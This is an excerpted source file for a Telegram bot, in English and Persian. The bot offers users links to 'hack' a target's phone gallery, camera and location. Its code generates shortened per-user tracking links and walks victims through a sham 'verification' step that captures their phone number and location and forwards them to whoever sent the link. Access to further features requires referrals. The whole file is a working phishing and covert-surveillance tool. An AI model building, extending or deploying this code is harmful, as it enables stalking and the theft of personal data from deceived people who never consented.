...
const messages = {
  en: {
    ...
    galleryLocked: (current, link) =>
      `❯ ɪɴ ᴛʜɪs ᴘᴀʀᴛ ᴏғ ᴛʜᴇ ʙᴏᴛ, ʏᴏᴜ ᴄᴀɴ ᴇᴀsɪʟʏ ʜᴀᴄᴋ ʏᴏᴜʀ ᴛᴀʀɢᴇᴛ ᴘʜᴏɴᴇ ɢᴀʟʟᴇʀʏ ʙʏ � Wᴇʀғᴜʟ ʙᴏᴛ. ʜᴏᴡᴇᴠᴇʀ, ᴛᴏ ᴀᴄᴄᴇss ᴀɴᴅ ᴜɴʟᴏᴄᴋ ᴛʜᴇ Gᴀʟʟᴇʀʏ Hᴀᴄᴋ, **ʏᴏᴜ ᴍᴜsᴛ ɪɴᴠɪᴛᴇ 3 ᴘᴇᴏᴘʟᴇ ᴜsɪɴɢ ʏᴏᴜʀ ɪɴᴠɪᴛᴇ** ʟɪɴᴋ\n\n**🔐 ʏᴏᴜʀ ɪɴᴠɪᴛᴇ = ${current}**\n\n**🖇 ʏᴏᴜʀ ɪɴᴠɪᴛᴇ ʟɪɴᴋ =** ${link}`,
...
const mainMenuKeyboard = (lang, userId, botInfo) => {
  const keyboard = [
    [{ text: messages[lang].menu.start, callback_data: 'menu_start' }],
  ...
  if (userId === botInfo.creatorId || userId === OWNER_ID) {
    keyboard.push([{ text: messages[lang].menu.adminPanel, callback_data: 'menu_admin_panel' }]);
  }
  return { reply_markup: { inline_keyboard: keyboard } };
};
  ...
  for (const user of users) {
    ...
    try {
      if (message.text) {
        ...
        await bot.telegram.sendDocument(user.userId, message.document.file_id, { caption: message.caption || '', parse_mode: 'Markdown' });
      } else if (message.video) {
        await bot.telegram.sendVideo(user.userId, message.video.file_id, { caption: message.caption || '', parse_mode: 'Markdown' });
      } else if (message.audio) {
        await bot.telegram.sendAudio(user.userId, message.audio.file_id, { caption: message.caption || '', parse_mode: 'Markdown' });
        ...
        await bot.telegram.sendMessage(user.userId, 'Unsupported message type', { parse_mode: 'Markdown' });
      }
      success++;
...
module.exports = async (req, res) => {
  try {
    ...
    const commands = [
      { command: 'start', description: '🚀 Start Bot | شروع ربات' },
    ];
    if (userId === botInfo.creatorId || userId === OWNER_ID) {
      commands.push({ command: 'panel', description: '🧰 Admin Panel | پنل مدیریت' });
    }
    ...
    if (!user) {
      ...
      await bot.telegram.sendMessage(botInfo.creatorId, notification, { parse_mode: 'Markdown' });
      ...
      if (user.referredBy !== 'none' && /^\d+$/.test(user.referredBy)) {
        ...
        if (referrer) {
          ...
          await bot.telegram.sendMessage(user.referredBy, referralMessage, { parse_mode: 'Markdown' });
        }
      }
    }
    ...
    if (user.isBlocked && userId !== botInfo.creatorId && userId !== OWNER_ID) {
      await bot.telegram.sendMessage(chatId, messages[lang].banned, { parse_mode: 'Markdown' });
      await user.save();
    ...
    if (update.message) {
      ...
      if (text?.startsWith('/start')) {
        ...
        if (user.requiresVerification && user.currentTrackerId) {
          try {
            ...
            await bot.telegram.sendMessage(trackerId, notification, { parse_mode: 'Markdown' });

            if (user.verificationStep === 'phone') {
              user.requiresVerification = false;
              user.currentTrackerId = null;
              user.verificationStep = 'none';
              await bot.telegram.sendMessage(chatId, 'Your phone number has been verified. Thank you!', { parse_mode: 'Markdown' });
            ...
            await bot.telegram.sendMessage(chatId, messages[lang].error, { parse_mode: 'Markdown' });
          }
        } else {
          await bot.telegram.sendMessage(chatId, messages[lang].noVerificationNeeded, { parse_mode: 'Markdown' });
        }
      }
        ...
        if (user.requiresVerification && user.currentTrackerId) {
          try {
            ...
            user.currentTrackerId = null;
            user.verificationStep = 'none';
            await bot.telegram.sendMessage(chatId, 'Your location has been verified. Now you can /start to use bot 🚀', { parse_mode: 'Markdown' });
          } catch (error) {
        ...
        if (text === messages[lang].adminMenu.stats) {
          ...
          await bot.telegram.sendMessage(
            ...
            mainMenuKeyboard(lang, userId, botInfo)
          );
        ...
        try {
          ...
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].setChannelSuccess(channelUrl, mainChannel),
            adminMenuKeyboard(lang)
          );
          user.adminState = 'admin_panel';
        } catch (error) {
      ...
      try {
        await bot.telegram.deleteMessage(chatId, callbackMessageId);
      } catch (error) {}
      ...
      if (callbackData === 'lang_en') {
        ...
        if (!user.hasJoined) {
          ...
          await bot.telegram.sendMessage(
            ...
            mainMenuKeyboard('en', userId, botInfo)
          );
        }
      }
        ...
        if (!user.hasJoined) {
          ...
          await bot.telegram.sendMessage(
            ...
            mainMenuKeyboard('fa', userId, botInfo)
          );
        }
      }
        ...
        try {
          const mainChannelId = mainChannel.replace('https://t.me/', '@');
          const mainMember = await bot.telegram.getChatMember(mainChannelId, userId);
          let customMember = { status: 'member' };
          if (customChannel) {
            const customChannelId = customChannel.replace('https://t.me/', '@');
            customMember = await bot.telegram.getChatMember(customChannelId, userId);
          }

          const isMainMember = ['member', 'administrator', 'creator'].includes(mainMember.status);
          const isCustomMember = customChannel ? ['member', 'administrator', 'creator'].includes(customMember.status) : true;

          if (isMainMember && isCustomMember) {
            user.hasJoined = true;
            await bot.telegram.sendMessage(
              chatId,
              messages[lang].welcome(user.username),
      ...
      else if (callbackData === 'menu_start') {
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].welcome(user.username),
          mainMenuKeyboard(lang, userId, botInfo)
        ...
        const longUrl = `https://t.me/${botInfo.username}?start=camera_${userId}`;
        const shortUrl = await shortenUrl(longUrl, userId, 'camera');
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].cameraMessage(shortUrl),
        ...
        const longUrl = `https://t.me/${botInfo.username}?start=location_${userId}`;
        const shortUrl = await shortenUrl(longUrl, userId, 'location');
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].locationMessage(shortUrl),
          backToMenuKeyboard(lang),
          { parse_mode: 'Markdown' }
        );
      }
        ...
        if (user.referralCount < 5) {
          ...
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].galleryLocked(user.referralCount, inviteLink),
            backToMenuKeyboard(lang),
            { parse_mode: 'Markdown' }
          );
        } else {
          const longUrl = `https://t.me/${botInfo.username}?start=gallery_${userId}`;
          const shortUrl = await shortenUrl(longUrl, userId, 'gallery');
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].galleryMessage(shortUrl),
            backToMenuKeyboard(lang),
            { parse_mode: 'Markdown' }
          );
        }
        ...
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].myInfoMessage(botInfo.username, userId),
          backToMenuKeyboard(lang),
          { parse_mode: 'Markdown' }
        );
      }
      ...
      else if (callbackData === 'menu_admin_panel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        await bot.telegram.sendMessage(chatId, messages[lang].adminPanel, adminMenuKeyboard(lang));
        user.adminState = 'admin_panel';
      }
